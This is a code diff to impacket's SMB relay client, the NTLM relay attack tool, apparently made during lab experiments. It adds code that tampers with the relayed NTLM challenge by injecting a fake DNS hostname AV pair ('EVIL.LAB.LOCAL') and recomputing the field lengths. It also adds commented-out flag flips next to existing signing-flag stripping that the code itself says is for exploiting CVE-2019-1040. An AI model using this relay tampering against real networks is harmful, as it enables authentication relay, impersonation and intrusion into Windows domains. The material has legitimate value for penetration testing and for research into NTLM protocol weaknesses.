@@ -41,7 +41,7 @@ from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCAR
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
     SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
 from impacket.smbconnection import SMBConnection, SMB_DIALECT
-from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_LM_KEY, NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY, NTLMSSP_NEGOTIATE_TARGET_INFO, AV_PAIRS, NTLMSSP_AV_TIME, NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, AV_PAIRS2, NTLMSSP_AV_DNS_HOSTNAME
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5 import scmr
@@ -310,6 +310,8 @@ class SMBRelayClient(ProtocolClient):
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
         # When exploiting CVE-2019-1040, remove flags
+        
+        #negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_TARGET_INFO
         if self.serverConfig.remove_mic:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
@@ -323,10 +325,30 @@ class SMBRelayClient(ProtocolClient):
         negotiateMessage = negoMessage.getData()
 
         challenge = NTLMAuthChallenge()
+        #challenge['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
+
         if self.session.getDialect() == SMB_DIALECT:
             challenge.fromString(self.sendNegotiatev1(negotiateMessage))
         else:
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
+
+        av_pairs = AV_PAIRS2(challenge['TargetInfoFields'])
+        #del av_pairs[NTLMSSP_AV_DOMAINNAME]
+        av_pairs.add_field(NTLMSSP_AV_DNS_HOSTNAME, "EVIL.LAB.LOCAL".encode('UTF-16LE'))
+        
+        av_pairs.dump()
+        challenge['TargetInfoFields'] = av_pairs.getData()
+        challenge['TargetInfoFields_len'] = len(av_pairs.getData())
+        challenge['TargetInfoFields_max_len'] = len(av_pairs.getData())
+        #negotiateMessage['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
+        #challenge['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
+        #challenge['flags'] ^= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+        #challenge['flags'] ^= NTLMSSP_NEGOTIATE_TARGET_INFO
+        
+        #challenge['TargetInfoFields'] = None
+        #challenge['TargetInfoFields_len'] = 0
+        #challenge['TargetInfoFields_max_len'] = 0
+        #challenge['TargetInfoFields_offset'] = 40 + 16 + len(challenge['domain_name'])
 
         self.negotiateMessage = negotiateMessage
         self.challengeMessage = challenge.getData()
